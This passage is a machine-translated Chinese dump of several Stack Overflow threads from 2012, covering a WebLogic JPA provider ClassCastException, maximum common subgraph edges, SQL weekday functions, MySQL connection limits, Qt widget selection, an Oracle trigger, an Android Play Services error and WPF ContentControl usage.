            <property name="hibernate.connection.charSet" value="UTF-8"/>
            <!-- Uncomment the following two properties for JBoss only -->
            <!-- property name="hibernate.validator.apply_to_ddl" value="false" /-->
            <!-- property name="hibernate.validator.autoregister_listeners" value="false" /-->
        </properties>
    </persistence-unit> 
```

[/code] 我还在 weblogic.xml 中提供了包级别首选项，下面是我的 weblogic.xml 文件。正如你所看到的，我已经明确告诉 weblogic 更喜欢 web 应用程序包，它仍然试图从 hibernate jar 加载 org.eclipse.persistence.jpa.PersistenceProvider 而不是 persistenceProvider。请帮助我在这里我被困在这一点 [代码]

```
<?xml version="1.0" encoding="UTF-8"?>
<wls:weblogic-web-app xmlns:wls="http://xmlns.oracle.com/weblogic/weblogic-web-app" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd http://xmlns.oracle.com/weblogic/weblogic-web-app http://xmlns.oracle.com/weblogic/weblogic-web-app/1.1/weblogic-web-app.xsd">
    <wls:weblogic-version>10.3.3</wls:weblogic-version>

    <wls:container-descriptor>
        <wls:index-directory-enabled>false</wls:index-directory-enabled>
        <!-- prefer-application-packages> <package-name>javax.persistence.spi.*</package-name> 
            </prefer-application-packages -->
        <wls:prefer-application-packages>
            <wls:package-name>antlr.*</wls:package-name>
            <wls:package-name>org.apache.commons.*</wls:package-name>
            <wls:package-name>org.apache.xmlbeans.*</wls:package-name>
            <wls:package-name>org.springframework.*</wls:package-name>
            <wls:package-name>org.hibernate.*</wls:package-name>
            <wls:package-name>javax.persistence.spi.*</wls:package-name>
            <wls:package-name>javax.persistence.criteria.*</wls:package-name>
            <wls:package-name>javax.persistence.metamodel.*</wls:package-name>
            <wls:package-name>javax.persistence.*</wls:package-name>

            <wls:package-name>org.joda.*</wls:package-name>
        </wls:prefer-application-packages>

    </wls:container-descriptor>

</wls:weblogic-web-app> 
```

[/代码]

上述异常的整个堆栈跟踪是 [code]

```
java.lang.ClassCastException: org.eclipse.persistence.jpa.PersistenceProvider cannot be cast to javax.persistence.spi.PersistenceProvider
    at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:62)
    at javax.persistence.Persistence.createEntityManagerFactory(Persistence.java:47)
    at com.mycompany.peasd.dbp.entity.DrlgBestPractices.entityManager_aroundBody100(DrlgBestPractices.java:878)
    at com.mycompany.peasd.dbp.entity.DrlgBestPractices.entityManager(DrlgBestPractices.java:1)
    at com.mycompany.peasd.dbp.entity.DrlgBestPractices.findDrlgBestPracticesEntries_aroundBody108(DrlgBestPractices.java:904)
    at com.mycompany.peasd.dbp.entity.DrlgBestPractices.findDrlgBestPracticesEntries(DrlgBestPractices.java:1)
    at com.mycompany.peasd.dbp.web.DrlgBestPracticesController.list(DrlgBestPracticesController.java:669)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:212)
    at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:126)
    at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:96)
    at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:617)
    at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:578)
    at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:80)
    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:900)
    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:827)
    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882)
    at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:778)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:707)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:820)
    at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:227)
    at weblogic.servlet.internal.StubSecurityHelper.invokeServlet(StubSecurityHelper.java:125)
    at weblogic.servlet.internal.ServletStubImpl.execute(ServletStubImpl.java:300)
    at weblogic.servlet.internal.TailFilter.doFilter(TailFilter.java:26)
    at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:56)
    at com.mycompany.peasd.dbp.filters.CheckUserAuthorizationFilter.doFilter(CheckUserAuthorizationFilter.java:120)
    at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:56)
    at org.springframework.orm.jpa.support.OpenEntityManagerInViewFilter.doFilterInternal(OpenEntityManagerInViewFilter.java:147)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
    at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:56)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:311)
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:116)
    at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:83)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:113)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:101)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:113)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:45)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilter(BasicAuthenticationFilter.java:150)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:182)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:87)
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:323)
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:173)
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346)
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259)
    at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:56)
    at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:77)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
    at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:56)
    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
    at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:56)
    at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.doIt(WebAppServletContext.java:3684)
    at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3650)
    at weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:321)
    at weblogic.security.service.SecurityManager.runAs(SecurityManager.java:121)
    at weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2268)
    at weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2174)
    at weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1446)
    at weblogic.work.ExecuteThread.execute(ExecuteThread.java:201)
    at weblogic.work.ExecuteThread.run(ExecuteThread.java:173) 
```

[/代码]

我在以下两个论坛上提出了相同的问题以寻求快速帮助。

[https://forums.oracle.com/forums/thread.jspa?threadID=2474374&stqc=true](https://forums.oracle.com/forums/thread.jspa?threadID=2474374&stqc=true) https://www.coderanch.com/t/599976/BEA-Weblogic/Weblogic-load-PersistenceProvider-wrong-jar

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-09T18:38:54.720

您必须遵循 user1877955 所说的所有内容，并添加此代码，以避免 ClassCastException：

web.xml

```
<listener>
    <listener-class>com.bla.Init</listener-class>
</listener> 
```

初始化.java

```
package com.bla;

import javax.servlet.ServletContextEvent;

public class Initjavax.servlet.ServletContextListener {

    public void contextDestroyed(ServletContextEvent arg0) {

    }

    public void contextInitialized(ServletContextEvent arg0) {
        HibernatePersistenceProviderResolver.register();
    }
} 
```

HibernatePersistenceProviderResolver.java

```
package com.bla;

import java.util.Collections;
import java.util.List;
import java.util.logging.Logger;

import javax.persistence.spi.PersistenceProvider;
import javax.persistence.spi.PersistenceProviderResolver;
import javax.persistence.spi.PersistenceProviderResolverHolder;

import org.hibernate.ejb.HibernatePersistence;

public class HibernatePersistenceProviderResolver implements PersistenceProviderResolver {
    private static final Logger LOGGER = Logger.getLogger(HibernatePersistenceProviderResolver.class.getName());

    private volatile PersistenceProvider persistenceProvider = new HibernatePersistence();

    public List<PersistenceProvider> getPersistenceProviders() {
        return Collections.singletonList(persistenceProvider);
    }

    public void clearCachedProviders() {
        persistenceProvider = new HibernatePersistence();
    }

    public static void register() {
        LOGGER.info("Registering HibernatePersistenceProviderResolver");
        PersistenceProviderResolverHolder.setPersistenceProviderResolver(new HibernatePersistenceProviderResolver());
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-16T05:51:24.227

以下提示也可能对遇到相同问题的人有所帮助

请注意，为了在符合 JPA1.0 的 weblogic10.3.3 上运行您的 JPA2.0 应用程序，您必须将您的 persistence.xml 重命名为 foo.xml 并在您的 applicationContext.xml 中提及此 xml 文件的名称如（我在这里使用 Spring）

```
<bean class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean" id="entityManagerFactory">
        <property value="classpath:META-INF/foo.xml" name="persistenceXmlLocation"/>
        <property name="persistenceUnitName" value="persistenceUnit"/>
        <property name="dataSource" ref="dataSource"/>
    </bean> 
```

根据您在应用程序中定义的 bean 重命名 persistenceUnit 和 dataSource

并且您必须在 weblogic.xml 文件中将包排除定义为

http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd [http://xmlns.oracle.com/weblogic/weblogic-web-app](http://xmlns.oracle.com/weblogic/weblogic-web-app) http://xmlns.oracle.com/weblogic/ weblogic-web-app/1.1/weblogic-web-app.xsd">10.3.3

```
<wls:container-descriptor>
    <wls:index-directory-enabled>false</wls:index-directory-enabled>
    <!-- prefer-application-packages> <package-name>javax.persistence.spi.*</package-name> 
        </prefer-application-packages -->
    <wls:prefer-application-packages>
        <wls:package-name>antlr.*</wls:package-name>
        <wls:package-name>org.apache.commons.*</wls:package-name>
        <wls:package-name>org.apache.xmlbeans.*</wls:package-name>
        <wls:package-name>org.springframework.*</wls:package-name>
        <wls:package-name>org.hibernate.*</wls:package-name>

        <wls:package-name>org.hibernate.validator.*</wls:package-name>

        <wls:package-name>javax.persistence.*</wls:package-name>
        <wls:package-name>org.joda.*</wls:package-name>
    </wls:prefer-application-packages>
</wls:container-descriptor> 
```

我花了几天时间来解决这个问题，并分享解决方案，希望有一天它可以使某人受益，欢呼。

请在我下面的博客文章中找到所有其他详细信息

[http://javaiscoool.blogspot.com/2012/12/deploy-jpa20-application-on-weblogic1033.html](http://javaiscoool.blogspot.com/2012/12/deploy-jpa20-application-on-weblogic1033.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-16T05:38:57.663

我终于找到了解决这个问题的方法，现在 JPA2.0 应用程序在 Weblogic10.3.3 服务器上运行良好。

我发现问题实际上与休眠验证器有关，在我的 JPA 方法代码中，我有一个“@Valid”注释以及我得到的对象，我试图在持久化之前使用休眠验证器来验证对象，那里我得到了所有这些例外。为了让我的应用程序在服务器上运行，我必须从我的 JPA 代码中删除那些 @valid 注释，现在一切正常。但现在我依赖于页面级别的验证，这在我的情况下已经足够好了。然而，理想的解决方案是找到一个兼容的 hibernat 验证器 jar 并将 @valid 注释保留在您的项目中，以便更好地验证。现在这个解决方案对我有用，ASA 我有时间我会尝试找到可以在我们拥有的服务器上使用此版本的休眠验证器 jar，并且也希望进行服务器端验证。我希望这种解决方法可以节省一些人的时间:)。

# algorithm - 找到一个公共子图

> ID：13806460
> 
> 赞同：1
> 
> 时间：2012-12-10T17:57:53.340
> 
> 标签：algorithm, math, graph

我试图找到给定两个图的公共子图。如果我有 2 个图 G1=(v1,e1) 和 G2=(v2,e2) 我必须找到公共子图 G=(V,E)，例如 G1 和 G2 的任何另一个公共子图不能包含更多E arris的红衣主教。

鉴于图 1 是

A - B

A - C

乙 - 丁

D - E

图2是

A - B

A - E

乙 - 丁

比算法应该返回

A - B

乙 - 丁

你能帮我用一个算法告诉我要参加哪些步骤吗？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:01:37.790

您没有正式描述您的问题，但从您的示例¹来看，您似乎正在寻找最大的公共*边缘*子集。

要实现它 - 您只需要 E1 和 E2 的[交集](http://en.wikipedia.org/wiki/Intersection_%28set_theory%29)。

**证明：**

**(->)**假设`(a,b)`在`E1 [intersection] E2`. 根据集合交集的定义——它对 E1 和 E2 都是通用的——因此对 G1 和 G2 也是如此。

**(<-)**假设`(a,b)`G1 和 G2 共有 - 然后`(a,b)`在`E1`和 `(a,b)`在`E2`- 根据交集的定义，`(a,b)`在`E1 [intersection] E2`

* * *

(1) 我得出的结论是，因为`(A,C)`不是“常见的”，但`(A,B)`在子图中 - 这意味着这不是对找到可以创建所需子图的顶点子集的限制（因为那时`A`应该从结果中排除）。

# mysql - 从日期转换为日期

> ID：13806463
> 
> 赞同：1
> 
> 时间：2012-12-10T17:58:06.940
> 
> 标签：mysql, sql

我有一个数据库，其中日期以 YYYY-MM-DD 格式存储。是否有 SQL 查询或仅使用 PHP 或 javascript 的简单方法可用于从 YYYY-MM-DD 日期获取日历日（星期一、星期二等）？

我尝试在该站点上搜索示例，但它们都使用 Java 或 C 或其他东西独有的函数或库。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:01:09.460

您没有指定什么 RDBMS，但您[之前的问题](https://stackoverflow.com/questions/13363406/printing-a-record-multiple-times-in-php-and-mysql)是 MySQL。如果您使用的是 MySQL，那么您可以使用[`DATE_FORMAT()`](http://dev.mysql.com/doc/refman/5.1/en/date-and-time-functions.html#function_date-format)：

```
select date_format(sysdate(), '%W') 
```

请参阅[SQL Fiddle with Demo](http://sqlfiddle.com/#!2/d41d8/4794)，只需替换`sysdate()`为您的日期列

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:02:40.243

这是在 SQL Server 中

```
SELECT DATENAME(dw, GETDATE()) 
```

星期一返回（今天是星期一）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:03:50.423

```
select datename(dw,getdate()) --Friday

select datepart(dw,getdate()) --6 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T18:06:40.977

**MySQL**

```
SELECT DATE_FORMAT(date_column, %W) 
```

**微软SQL**

```
SELECT DATENAME(dw, date_column) 
```

**甲骨文**

```
SELECT to_char(date_column, 'DAY') 
```

# mysql - 与 MySQL 服务器的 10 个并发连接是否足够？

> ID：13806469
> 
> 赞同：3
> 
> 时间：2012-12-10T17:58:20.863
> 
> 标签：mysql, connection, limit

请任何人解释这个mysql并发连接。我的主机只提供 10 个并发连接。够了吗？。这是否意味着只有 10 个用户可以同时访问该网站？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:21:29.823

> 这是否意味着只有 10 个用户可以同时访问该网站？

这不是对 10 个并发用户意味着什么的明确衡量标准。考虑一下我拥有的以下假设博客：

我访问 example.com/blog，它在 100 毫秒内加载。然后我读了这个页面 3 分钟。在三分钟的过程中，我加载的页面花费了 100ms 的加载时间，其中 < 100ms 实际用于连接数据库。

这意味着在我加载页面的同时，其他 9 个人可能也在加载页面。然而，该页面已经打开了 3 分钟，并且没有耗尽任何并发连接，并且数百人可能已经加载了该页面，与我“访问该网站”无关的并发连接。

因此，重要的一点是，在*任何给定的精确时刻*，您是否会有超过 10 人访问它？假设您甚至找到了减少代码隐藏页面加载时间的最基本方法（php，而不是加载的外部资产），您将可以轻松地每小时处理数百人，而不会遇到“太许多连接”错误，这将是实际问题的信号。

另一方面——同样取决于你的内容——如果你认为你有足够的用户（或足够的数据库连接）偶然有超过 10 个用户都试图在完全相同的 ~100-200 毫秒时间内做某事窗口，在尝试刷新时仍然存在 - 然后您必须请求主机达到该限制或移动到其他地方。在这一点上，许多主机及其背后的 Web 服务器可以帮助记录这些问题或引起您的注意。在那之前，即使是中型网站，10 个并发用户也很有可能就足够了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:25:22.800

考虑这个问题的数学：如果您的平均页面执行时间是 5 秒，并且您有 300 个用户并且他们倾向于每分钟点击一次，那么 10 个连接将使您达到饱和点：((300 * 5) / 60) == 10\. 您的选择：让您的页面更快（例如，亚秒级页面将增加您的限制 x6）或获得更多连接。否则，您的用户最终将等待更长时间。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:02:22.887

这意味着只有 10 个用户可以同时访问数据库。

[http://dev.mysql.com/tech-resources/articles/mysql-administrator-best-practices.html](http://dev.mysql.com/tech-resources/articles/mysql-administrator-best-practices.html)

10 是一个非常低的值，您可以放心地增加它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T18:06:16.527

不，不是只有 10 个用户可以同时访问该*网站*，而是同时可能的数据库连接数，即

一次，只有 10 个连接到达那里完成处理，其他请求需要等到连接被释放。

如果同时访问该站点的用户数量较少，那么这不是问题。但是，如果您需要为更多用户扩展网站，则需要增加此数字。

# c++ - 单击另一个小部件时将小部件标记为未选中

> ID：13806470
> 
> 赞同：1
> 
> 时间：2012-12-10T17:58:23.980
> 
> 标签：c++, qt

我有一个显示电影缩略图（子类 qwidgets）的流程布局[。](http://doc.qt.digia.com/qt/layouts-flowlayout.html)当我单击缩略图时，通过为其设置样式表（css 边框）将其标记为选中。我想要做的是，如果我 1）单击另一个缩略图，或 2）单击包含 flowlayout 的小部件，它应该被标记为未选中。

我目前已经实现了 mousePressEvent(QMouseEvent *) 方法来在单击缩略图时绘制边框。我不确定如何继续将其标记为未选中。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:17:48.827

我过去做过这样的事情的一种方法是在按钮类中发出一个信号，指示所有其他按钮不被选中。

因此，具有指向所有对象的指针的小部件在其信号之一的信号与其取消选择对象的信号之间建立连接。

以下是您需要的一些骨架类。

```
class Button
{
signals:
    void selected(Button *);
slot:
    void deselect(Button *);
}

class ButtonContainer
{
public:
    void addButton(Button *)
signals:
    void buttonSelected(Button *);
} 
```

添加按钮时，以这种方式将其连接到容器：

```
QObject::connect(button, SIGNAL(selected(Button *)), 
                 buttonContainer, SIGNAL(buttonSelected(Button *)));
QObject::connect(buttonContainer, SIGNAL(buttonSelected(Button *)), 
                 button, SLOT(deselect(Button *))); 
```

当鼠标按下事件发生时，在应用您的“选定”样式表后发出此信号：

```
emit selected(this); 
```

在取消选择插槽中放置：

```
void Button::deselect(Button * selectedButton)
{
    if(this != selectedButton)
    {
        // apply stylesheet for deselecting if it was previously selected
    }
} 
```

希望有帮助。

顺便说一句，请确保您没有过于频繁地设置样式表。我没有进行广泛的测试，但至少在某些版本的 Qt 中，它可能会超出 QList 的限制。它们具有可用于频繁更改样式的动态属性：

[QList：内存不足](https://stackoverflow.com/questions/13564823/qlist-out-of-memory/13568733#13568733)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:18:00.143

您可以将当前选定小部件的链接存储在某处，并在选择其他小部件时取消选择它。像这样的东西：

```
someClass::someClass():
activeWidget(0)
{
    for(......)
    {
        subclassedQWidget *w = new subclassedQWidget(this);
        // ......
        // ......
        QObject::connect(w, SIGNAL(iAmClicked()), this, SLOT(someoneClicked()))
    }

}

someClass::someoneClicked()
{
    subclassedQWidget *caller = (subclassedQWidget*)QObject::sender();
    if (caller == activeWidget) {return;} //Do nothing when active widget clicked
    if (activeWidget) activeWidget->unSelect();
    if (caller)
    {
        caller->select();
        activeWidget = caller;
    }
} 
```

在`mousePressEvent`你的`subclassedQWidget`你中`emit iAmClicked()`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:02:06.680

我对点的多边形做了类似的事情。当一个人在我的多边形中选择一个点时，我将其着色为绿色并取消选择前一个点（除非他们持有 ctrl）。

为了实现这一点，我有一个管理 QGraphicsItem 来保存我的多边形及其所有点。在单击事件上，它确定选择了哪个点并确定是取消选择还是添加到选择中。

对于您的实现，也许是一个管理 QWidget 类，它包含所有这些缩略图并在将所有点击事件传递给正确的子小部件之前拦截所有点击事件。

# sql - 如何在 Oracle 中创建计算派生值的触发器

> ID：13806471
> 
> 赞同：0
> 
> 时间：2012-12-10T17:58:23.780
> 
> 标签：sql, oracle

当在 ContractInfo 中插入元组时，创建一个触发器来计算持续时间列的值。

```
ContractInfo Table
HAS_CONTRACT          DATE_FROM DATE_TO     DURATION
--------------------- --------- --------- ----------
Simon Palm            20-AUG-01 19-AUG-02          0
Simon Palm            20-SEP-02 19-AUG-03          0
Flut                  10-JUN-99 09-SEP-02          0 
```

我怎样才能触发？我对触发器有点困惑。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:30:52.233

```
SQL> create or replace trigger ContractInfo_buifer
  2  before insert or update on contractinfo
  3  for each row
  4  declare
  5  begin
  6    :new.duration := :new.date_to - :new.date_from; -- answer in days.
  7  END;
  8  /

Trigger created.

SQL> insert into ContractInfo (HAS_CONTRACT,  DATE_FROM, DATE_TO ) values ('Simon Palm', to_date('20-AUG-01', 'dd-mon-rr'), to_date('19-AUG-02', 'dd-mon-rr'))
  2  /

1 row created.

SQL> select * from contractinfo;

HAS_CONTRA DATE_FROM DATE_TO     DURATION
---------- --------- --------- ----------
Simon Palm 20-AUG-01 19-AUG-02        364 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:02:48.087

这就是我对 Oracle 的处理方式：

```
CREATE OR REPLACE TRIGGER TRIG_ContractInfo
    BEFORE INSERT OR UPDATE ON ContractInfo REFERENCING
    NEW AS NEW
    OLD AS OLD
    FOR EACH ROW
DECLARE
BEGIN
  IF INSERTING THEN
    /* ON INSERT STATEMENTS */
  END IF;
  IF UPDATING THEN
    /* ON UPDATE STATEMENTS */
  END IF;
  /* COMMON STATEMENTS */
END;
/ 
```

# java - Android 2.3.3 上的 AccountPicker 错误

> ID：13806472
> 
> 赞同：0
> 
> 时间：2012-12-10T17:58:28.087
> 
> 标签：java, android

我正在编写一个使用 Google Oauth2 登录的 Android 应用程序。为了提示用户输入帐户，我正在使用 AccountPicker.newChooseAccountIntent()。

这依赖于设备上可用的 Google Play 服务，因此在我的活动的 onResume() 中，我根据 google 文档运行以下检查：

```
// Check that Google Play Services are available on the device
// We use them to show the account picker dialog
int status = GooglePlayServicesUtil.isGooglePlayServicesAvailable(this);

if(status != ConnectionResult.SUCCESS){     
    if(GooglePlayServicesUtil.isUserRecoverableError(status)){
        GooglePlayServicesUtil.getErrorDialog(status, this, REQUESTID_PLAY_SERVICES).show();
    } else {
        Toast.makeText(getApplicationContext(), R.string.purchases_not_supported, Toast.LENGTH_LONG).show();
        finish();
    }
} 
```

这在我的 Jellybean 设备上效果很好，但是在运行 Android 2.3.3 (Gingerbread) 的旧设备上尝试它时，我遇到了以下异常。

有没有人见过这个？

```
E/Activities/MainActivity( 1906): Error: Unable to resume activity {com.somecompany.someapp/com.somecompany.someapp.activities.PurchaseActivity}: java.util.MissingResourceException: Can't find resource for bundle 'com.google.android.gms.common.strings.GmsStrings_en_US', key ''
E/Activities/MainActivity( 1906): java.lang.RuntimeException: Unable to resume activity {com.somecompany.someapp/com.somecompany.someapp.activities.PurchaseActivity}: java.util.MissingResourceException: Can't find resource for bundle 'com.google.android.gms.common.strings.GmsStrings_en_US', key ''
E/Activities/MainActivity( 1906):       at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2460)
E/Activities/MainActivity( 1906):       at android.app.ActivityThread.handleResumeActivity(ActivityThread.java:2481)
E/Activities/MainActivity( 1906):       at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1847)
E/Activities/MainActivity( 1906):       at android.app.ActivityThread.access$1500(ActivityThread.java:132)
E/Activities/MainActivity( 1906):       at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1038)
E/Activities/MainActivity( 1906):       at android.os.Handler.dispatchMessage(Handler.java:99)
E/Activities/MainActivity( 1906):       at android.os.Looper.loop(Looper.java:143)
E/Activities/MainActivity( 1906):       at android.app.ActivityThread.main(ActivityThread.java:4263)
E/Activities/MainActivity( 1906):       at java.lang.reflect.Method.invokeNative(Native Method)
E/Activities/MainActivity( 1906):       at java.lang.reflect.Method.invoke(Method.java:507)
E/Activities/MainActivity( 1906):       at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
E/Activities/MainActivity( 1906):       at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
E/Activities/MainActivity( 1906):       at dalvik.system.NativeStart.main(Native Method)
E/Activities/MainActivity( 1906): Caused by: java.util.MissingResourceException: Can't find resource for bundle 'com.google.android.gms.common.strings.GmsStrings_en_US', key ''
E/Activities/MainActivity( 1906):       at java.util.ResourceBundle.missingResourceException(ResourceBundle.java:225)
E/Activities/MainActivity( 1906):       at java.util.ResourceBundle.getBundle(ResourceBundle.java:218)
E/Activities/MainActivity( 1906):       at com.sonelli.y.a(Unknown Source)
E/Activities/MainActivity( 1906):       at com.sonelli.y.a(Unknown Source)
E/Activities/MainActivity( 1906):       at com.sonelli.h.a(Unknown Source)
E/Activities/MainActivity( 1906):       at com.somecompany.someapp.activities.PurchaseActivity.onResume(PurchaseActivity.java:49)
E/Activities/MainActivity( 1906):       at android.app.Instrumentation.callActivityOnResume(Instrumentation.java:1242)
E/Activities/MainActivity( 1906):       at android.app.Activity.performResume(Activity.java:3957)
E/Activities/MainActivity( 1906):       at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2450)
E/Activities/MainActivity( 1906):       ... 12 more
~ 
```

# wpf - 如何将 UserControl 加载到 (WPF) 窗口中的 ContentPresenter 中？

> ID：13806473
> 
> 赞同：1
> 
> 时间：2012-12-10T17:58:32.123
> 
> 标签：wpf, mvvm, user-controls, contentpresenter

我有一个包含 Viewbox 的窗口。在那个 Viewbox 中，我想拥有我已经创建为 UserControls 的几个视图之一。我正在使用 MVVM（模型视图视图模型）设计模式。我在网上搜索了大约一个小时，但找不到任何示例或教程来解释如何使用`ContentPresenter`.

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-10T18:39:56.453

要看。

我认为您的主要问题是 a`ContentPresenter`仅在控件模板中使用。您不能只是将其粘贴在 Window 中并期望它显示窗口的内容。我相信您*真正*需要做的是使用[ContentControl](http://msdn.microsoft.com/en-us/library/system.windows.controls.contentcontrol.aspx)来托管您的 UI。

通过将模型绑定`Content`到此控件的属性，您可以设置包含该模型的预期视图的 DataTemplates。我给你一个简短的例子。请注意，这可能与您的设计不匹配，但它展示了它们是如何结合在一起的。

首先，对于每个视图，创建一个模型（或 ViewModel）来管理该视图的数据（和交互）。

```
public sealed class Dialog : INotifyPropertyChanged // or DependencyObject
{
    public string Input {get;set;} // INPC or DP implementation not shown
    public ICommand Cancel {get;set;}
    // class definition not shown
} 
```

接下来，定义要在 ContentPresenter 中显示的视图

```
<UserControl x:Class="Herp.DialogView" 
    HideImplementationDetails="true">
    <Border BorderBrush="Red" BorderThickness="5">
        <TextBlock Text="{Binding Input}" />  
        <Button Command="{Binding Cancel}">Cancel</Button>
        <!-- etc etc -->      
    </Border>
</UserControl> 
```

接下来，在您的窗口中，添加 ContentControl 和 DataTemplate

```
<Window HideImplementationDetailsForBrevityOfXaml="true">
    <Window.Resources>
        <DataTemplate xmlns:t="clr-namespace:Herp" 
            DataType="{x:Type t:Dialog}">
            <t:DialogView />
        </DataTempalte>
    </Window.Resources>
    <ContentControl Content="{Binding}" />
</Window> 
```

最后将 Window 的 DataContext 设置为您的`Dialog`模型。

```
public MyWindow()
